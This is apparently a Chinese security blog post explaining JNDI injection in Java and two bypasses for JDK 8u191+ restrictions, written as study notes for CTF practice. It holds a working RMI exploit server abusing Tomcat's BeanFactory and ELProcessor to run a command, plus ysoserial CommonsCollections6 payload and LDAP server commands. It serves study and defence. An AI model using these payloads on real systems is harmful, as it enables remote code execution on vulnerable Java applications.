#  高JDK的JNDI绕过之复现某比赛0解题   
Zjacky  白帽子左一   2024-04-27 12:04  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
# 前言  
  
本篇文章首发在先知社区 作者Zjacky(本人) 先知社区名称: Zjacky 转载原文链接为https://xz.aliyun.com/t/13793  
  
诶呀这玩意学了蛮久了真的，离大谱，各种事故各种坑点，不过结果还算好都弄清楚了，记录下顺便分享两个CTF案例来进行加深理解，下次遇到高jdk的JNDI就不会那么踉踉跄跄了  
  
‍  
# JNDI注入原理  
  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicpTylicvmBj8lMtu2tUxAkD7kfnn6NFMkaAVfaud34jO8HQoTbrPxInw/640?wx_fmt=png&from=appmsg "")  
  
JNDI可以访问的目录及服务，比如：DNS、LDAP、CORBA对象服务、RMI等等。  
  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibiciaPmzPJiaWcl7Kk1U0R0ExdWdrTqPH7aev2T4aUhDic78uNtU0Ju20xjg/640?wx_fmt=png&from=appmsg "")  
  
‍  
## RMI + JNDI  
  
首先上述也讲清楚了，其实JNDI的标准注入就是从RMI中去寻找对应的名字所对应的Reference对象，而这个对象是可以任意写地址和类的，所以其实JNDI就是去找这么个东西，可以看如下demo  
  
首先是开启一个RMI的服务器，然后在JNDI的Server端把我们的Reference对象重新绑定到某个名字下，此时在写了恶意payload的class文件目录下开启http服务，然后用JNDI的客户端直接去lookup查找rmi服务  
  
‍  
```
//JNDIClient.java
package jndi;

import method.SayHello;

import javax.naming.InitialContext;

public class JndiClient {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        InitialContext initialContext = new InitialContext();
        SayHello sayHello = (SayHello)initialContext.lookup("rmi://127.0.0.1:1099/sayhello");
    }
}


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicYmtOTW9oOibWzjkaFLxNACa15onKx82WOUMf3uiagJvfTutFBgDykvaA/640?wx_fmt=png&from=appmsg "")  
  
来跟一下断点，直接在JndiClient.java的lookup方法下断点调试  
  
会先走几个无关紧要的lookup方法最后会走到对应协议的lookup方法中，因为我走的是RMI协议所以最后走到了  
  
\rt.jar!\com\sun\jndi\rmi\registry\RegistryContext.java#lookup()方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibiciaSBWv9Da1Zj9KeHyMjtGFC7adKoAD9mEO3s2lkPzicdQSD3bc2mcuzw/640?wx_fmt=png&from=appmsg "")  
  
然后返回的时候把获取到的结果传入decodeObject方法，跟进下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicJUrkibiaWQXW5B9g5643h4y3X939wWb1RpWiciadHJOLqScJZFbJtC9xpw/640?wx_fmt=png&from=appmsg "")  
  
发现只要是继承了RemoteReference类，就会调用getObjectInstance方法继续往下处理，再次跟进下  
  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicj2iawUkI6wLUWbscRjR5usVSeHiafkxZx5ID6L70xaOTfGGJC3C8uAkg/640?wx_fmt=png&from=appmsg "")  
  
发现是从引用的变量中获取工厂，调用了getObjectFactoryFromReference方法 ，继续跟进  
  
发现就已经开始类加载了(我的类是T)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibic5CrtcO9CqMX6zj83x5kibr12D2E7D7NoA7icicx4ORLicXvIG0WF0qaRlA/640?wx_fmt=png&from=appmsg "")  
  
然后先用 AppClassLoader寻找本地类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicqu1Ve1smPZ3NF2kO0ar1cevWiarpfwWzOopBj8dt7U7ZKKhzWm8bDCw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
当然这里找不到的话就会走下面的逻辑再次加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicdQ2an8oKibwPS7nWngKqoWgd9g0dibObpU5DxbVb5xc83aicPzQsmE0zQ/640?wx_fmt=png&from=appmsg "")  
  
跟进下发现最后会调用URLClasserloader去远程加载  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicdYfiaENLZGBxqqbic7u5wvsj4va4ic0ic9dib6cb6h5G0w2ibceUEv8dpljQ/640?wx_fmt=png&from=appmsg "")  
  
那么就是相当于会去在我们的路径下去找我们的恶意类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicnEGxXhcpez4Ytg9SPy216ibTwcOtgpO2Gg0djU8PicpI828R7POymYLw/640?wx_fmt=png&from=appmsg "")  
  
加载之后最后在这里进行类的初始化执行了我们的代码，所以只要一执行完这个代码就会弹计算器了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicQibQZ0uBibOJCePP2DfKcDEa2PlafRWQmnCDTNE6EwYlibDKY0zJ12hzQ/640?wx_fmt=png&from=appmsg "")  
  
‍  
## LDAP + JNDI  
  
一样直接起个LDAP服务下个断点  
  
经过几层的lookup方法最后调用到c_lookup方法中，在这个方法底下会去调用decodeObject方法将我们传入的ldap对象  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicPYyWCAY8kYPQwNYI7PAEH7yiblWbH8HOanfLAhBLicg1lhktgickBTZkA/640?wx_fmt=png&from=appmsg "")  
  
跟进decodeObject方法 ，发现会根据LDAP查询的结果来进行不同方法的调用，因为LDAP中会有能够存储很多值比如序列化，引用类 等 ，而我们传入的肯定是引用类于是就走到了引用类的判断方法中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicib05AX9GSZGpwGRrHUMOEjxOo8fDOib8iccQXS1YzPmrMNibyTx1MjHz7w/640?wx_fmt=png&from=appmsg "")  
  
这个方法其实大致了解下即可，就是个去解析我们的Reference引用对象的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibiciaTAbRXDxP8Lhu1KPTe3RDZZ0j9cj5ibQ7HGfJIshP97h2c2GysdGnHA/640?wx_fmt=png&from=appmsg "")  
  
我们直接看将返回的接口做了什么即可，最后在\rt.jar!\com\sun\jndi\ldap\LdapCtx.java将返回结果传入了DirectoryManager.getObjectInstance这个方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicpPPRNhD59O8kZx5miaSv0ibrUkN9gYRtJTdKBANgsNnXGRzHHDR7IpCw/640?wx_fmt=png&from=appmsg "")  
  
跟进下发现跟RMI差不多一样去调用了getObjectFactoryFromReference方法去解析我们的引用类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicPwGjrIDmVww2I7mKQcjickibkkhicuwG7IsOasLznzyXMGw2euIfic0n4g/640?wx_fmt=png&from=appmsg "")  
  
后面代码就是跟RMI一模一样了都是去本地找类找不到用URLClassLoader去远程加载类了  
  
‍  
  
‍  
# 高版本限制  
  
‍  
  
其实在之前讲的原理当中可以知道，在jdk8u191之前都是存在这些的，虽然说ldap是低版本的绕过，问题其实也就是可以去远程加载类  
  
然后更改到jdk8u201之后就不行了，具体改了什么继续调试下  
  
跟到D:\Environment-Java\java-1.8.0_201\src.zip!\javax\naming\spi\DirectoryManager.java的关键代码 跟进下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicPT6jWt6QoBGJhKG4YEfMgeyNciaMujqUetVic3fnbWBuiaNxiaQAwl9MsQ/640?wx_fmt=png&from=appmsg "")  
  
进行加载类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicWqW2RU3SCIkBVdsmPxF5BOol8LFLLUCgyvWWKgicpDSVHPoTuk1ONcg/640?wx_fmt=png&from=appmsg "")  
  
本地类加载不成功后看远程类加载的逻辑  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibic1ERkibnDd7ncUor8Sd410Aiad5ULqDrdtTQzxuWEmDLlPEoZtB5rsyNg/640?wx_fmt=png&from=appmsg "")  
  
跟进后发现有一个属性叫trustURLCodebase 要等于true才能够进行远程加载，而默认的trustURLCodebase是被设置成了false  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicZvxVoYsmK1GWLCPEuYgEJvqHF1kwskZK7R7gC7MpLrREoxvS4yibNxQ/640?wx_fmt=png&from=appmsg "")  
  
也就是说，只要人为不修改，就不会存在远程加载类的行为了，那也就是说这个远程加载类就是被修复了  
  
‍  
# 绕过  
  
‍  
  
但是转过头来一想，我们远程加载被修复了，但是还可以本地加载  
  
‍  
  
所以对于JDK8u191以后得版本来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：  
  
‍  
1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令  
  
1. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行  
  
‍  
  
这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。我们先来看一些基本概念，然后再分析这两种绕过方法。  
  
‍  
## 利用本地恶意Class作为Reference Factory  
  
看名字其实很帅，但是调试一下就可以很清楚理解了  
  
在D:\Environment-Java\java-1.8.0_201\jre\lib\rt.jar!\com\sun\jndi\ldap\Obj.java中会去把LDAP或者RMI所解析得到的Reference解出来  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicECNoy7jjkbnd4PxB8sNuzqOomu198AecQ2QmiblgF181WNZWRop8eKA/640?wx_fmt=png&from=appmsg "")  
  
紧接着跟进到D:\Environment-Java\java-1.8.0_201\src.zip!\javax\naming\spi\DirectoryManager.java#getObjectFactoryFromReference()可以发现他是接收了两个传参，一个是引用类，另一个是引用类的工厂名字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicBIdvWZZG5caDVrQpsrgj38EgPhp6wiblrGqSmlObia2ic99oL7TXc5Akg/640?wx_fmt=png&from=appmsg "")  
  
并且返回的类型是ObjectFactory类(ObjectFactory其实是一个接口)  
  
‍  
  
之后这个工厂类去调用了getObjectInstance方法，那么现在思路就有了，如果我们去找的是本地的工厂类，并且这此类实现了ObjectFactory接口并且他还有getObjectInstance方法，而getObjectInstance这个方法还有危险的操作，那么就可以进行一个利用了(说起来感觉条件很苛刻)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicbZzrCHib20icibW1geScAgHTcfTOr4h0CWa09ib4ASfHzK81icOuUIuAChQ/640?wx_fmt=png&from=appmsg "")  
  
但实际上真的有这个类，org.apache.naming.factory.BeanFactory  
  
我们去看看这个类  
  
实现了ObjectFactory接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicPYyWCAY8kYPQwNYI7PAEH7yiblWbH8HOanfLAhBLicg1lhktgickBTZkA/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
存在getObjectInstance方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicMm692slaZKhQRCt5nVFamTt4mib6wN2q9uV6JbLUHdGvMMPcicC3icddw/640?wx_fmt=png&from=appmsg "")  
  
有一个反射的方法,该类的getObjectInstance()函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicqpsIMdUysGXuAoF1ZUzZzUSNlTQU2I6FcLUibTg4h1hnNF7e74iaibpTA/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
EXP  
```
package jndi.bypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(3377);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd', '/c', 'calc']).start()\")"));
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}

```  
  
‍  
  
‍  
## 利用LDAP返回序列化数据，触发本地Gadget  
  
其实这里就是在分析LDAP+JNDI的时候他有个类似swich的东西，当时传入的是引用类，所以走了引用类的逻辑，但是如果我们传入的是序列化的对象，并且后续会被反序列化，那么就相当于存在了一个天然的反序列化入口了，就可以触发本地的Gadget了  
  
‍  
  
本地调试下 先添加CC的依赖  
```
       <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>

```  
  
‍  
```
java -jar y4-yso.jar CommonsCollections6 "calc" > 1.ser | base64 

```  
  
然后传进ldapserver  
```
java -jar LDAPServer.jar 127.0.0.1 1.txt

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibic6wB76cQo957Z0dDZokicIFojibnSngyFHDhpaoyrCD6jaVayPBiaQHlicw/640?wx_fmt=png&from=appmsg "")  
  
然后直接去JNDI查询  
```
SayHello sayHello = (SayHello)initialContext.lookup("ldap://127.0.0.1:6666/Evail");

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicpmyohQOen5NFaK8kAaCZWeXnarqlzQA3judL8VNE6g8CQnq6icSpHBQ/640?wx_fmt=png&from=appmsg "")  
  
调试一下  
  
会走到序列化的逻辑进行反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibicFyd1AtqyTzkXsnC7Pkd2nO2AHdXH2khe65JEPfShq1qGxAu16APxow/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibico1PcQXLySHBcSGxbCiacapkoSWCf7giajBZWRzvyBhYknLObA5Km0icRA/640?wx_fmt=png&from=appmsg "")  
  
‍  
# 总结  
  
这里要注意的点就是 RMI和LDAP都是需要出网的环境进行远程方法调用或者是目录名称查询，所以都是可以操作的，下图是两种方式的jdk适配版本总结，那么其实绕过跟一遍断点即可理解完，都是一些攻防博弈，非常值得学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSETIFz1I4IWuxZckTR9maibic3k647cbhyAXsZYU6BQ0FQ2XobwlJF5fYZ9OdlDxcOkqrwsicuOqzzeQ/640?wx_fmt=png&from=appmsg "")  
  
声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**  
！  
  
**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk安全知识星球,我们一起进步一起学习。星球不定期会分享一些前言漏洞，每周安全面试经验、SRC实战纪实等文章分享，微信识别二维码，只需25，即可加入，如不满意，72 小时内可在 App 内无条件自助退款。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGpTtick8dYImTUOcmaQWHRzkPIp7SwgncysYUIo0cKZAcHvXcMEBL5ZZEJCIpUP08SGOR8bnejDxQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
